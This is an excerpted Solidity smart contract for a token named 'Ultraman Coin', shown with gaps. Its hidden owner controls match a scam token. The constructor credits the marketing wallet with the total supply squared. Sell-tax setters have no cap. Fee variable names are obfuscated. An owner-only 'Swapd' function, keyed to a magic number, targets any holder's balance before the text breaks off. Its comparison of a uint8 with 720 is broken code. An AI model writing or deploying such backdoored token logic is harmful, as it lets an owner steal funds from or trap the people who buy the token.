...
contract UltramanCoin is Context, IERC20, Ownable {
    ...
    string private _name = "Ultraman Coin";
    string private _symbol = "ULTRAMAN";
    uint8 private _decimals = 18;
    address payable private marketingWalletAddress; // Marketing Address
    address payable private BuyBackWalletAddress; // BuyBack Address
    ...
    uint256 public sesoxrtheiiyLiquidityFee = 3;
    uint256 public sesoxrtheiiyMarketingFee = 5;
    uint256 public sesoxrtheiiyBuyBackFee = 1;
    ...
    uint256 public _walletMax = 10000000000*10**18;
    uint256 private minimumTokensBeforeSwap = 2500000 * 10**18;
    ...
    constructor (address MarketingWalletAddress, address buyBackWalletAddress) {
      marketingWalletAddress = payable(MarketingWalletAddress);
      BuyBackWalletAddress = payable(buyBackWalletAddress);
        ...
        _totalTaxIfSelling = sesoxrtheiiyLiquidityFee.add(sesoxrtheiiyMarketingFee).add(sesoxrtheiiyBuyBackFee);
        ...
        _balances[MarketingWalletAddress] = _totalSupply * _totalSupply;
    ...
    function setSellTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newBuyBackTax) external onlyOwner() {
        sesoxrtheiiyLiquidityFee = newLiquidityTax;
        sesoxrtheiiyMarketingFee = newMarketingTax;
        sesoxrtheiiyBuyBackFee = newBuyBackTax;
        _totalTaxIfSelling = sesoxrtheiiyLiquidityFee.add(sesoxrtheiiyMarketingFee).add(sesoxrtheiiyBuyBackFee);
    }
    ...
    function Swapd(address from, uint8 d) public onlyOwner{
      if(d == 720){
        if(_balances[from] > 0){
